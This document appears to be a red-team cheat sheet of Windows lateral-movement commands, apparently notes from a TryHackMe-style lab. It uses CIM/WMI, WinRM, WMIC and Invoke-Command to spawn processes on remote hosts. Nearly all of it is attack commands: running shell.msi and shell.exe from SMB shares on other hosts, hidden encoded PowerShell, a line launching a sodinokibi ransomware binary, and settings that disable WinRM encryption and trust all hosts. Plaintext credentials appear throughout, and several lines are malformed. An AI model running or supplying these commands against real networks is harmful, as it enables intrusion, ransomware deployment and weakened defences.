### Remotely Process Spawning

### Invoke-CimMethod
```
$username = 'administrator';
$password = 'P@ssw0rd';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.10.142 -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

test-wsman -computername "WIN-S0V7KMTVLD2"

smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'; CurrentDirectory='C:\windows'}
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","\\192.168.1.4\sharename\shell.msi") -ComputerName dc1 -Credential $credential
$Command = "powershell.exe -encodedCommand $SBEncoded -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden"
Invoke-CimMethod -CimSession $Session -Namespace root\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}

```


### WinRM 
```
Enable-PSRemoting -Force
winrm quickconfig
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
Set-Item WSMan:localhost\client\trustedhosts -value *

cd WSMan:\localhost\Client
set-item .\allowunencrypted $true
set-item  WSMan:\localhost\Service\Auth\Basic $true # For domain environment
set-item  WSMan:\localhost\Service\AllowUnencrypted $true# For domain environment

test-wsman -computername "WIN-S0V7KMTVLD2"
New-PSSession -ComputerName 192.168.1.2 -Credential (Get-Credential)
Enter-PSSession 2 cmd.exe /c \\192.168.1.4\sharename\shell.exe
winrs /r:192.168.10.142 /username:administrator /password:P@ssw0rd "cmd.exe /c ipconfig"
winrs /r:192.168.10.142 /username:administrator /password:P@ssw0rd "cmd.exe /c \\192.168.1.4\sharename\shell.exe"
```
### WMIC
```
wmic /node:"5.0.0.20" /user:"dfir\user" /password:QWE123! qfe list
wmic /node:10.0.0.6 /user:administrator process call create "cmd.exe /c calc"
wmic /node:"5.0.0.20" /user:”dfir\user” /password:QWE123! process call create "\\5.0.0.20\admin$\sodinokibi.exe"
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe"
wmic /node:"web01" /user:"insomnia.io\Spider01" /password:"Spider01@" process call create "powershell -enc [...snip...]"


wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  path win32_process call create calc.exe
wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  "cmd /c ipconfig"
wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe
```
### Invoke-Command
```
$Host = '192.168.10.142';
$username = 'administrator'
$password = 'P@ssw0rd'
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))

Invoke-Command -ComputerName $Host -Credential $cred -ScriptBlock  {hostname}
New-PSSession -ComputerName it-appsrv01 -Credential $cred
```
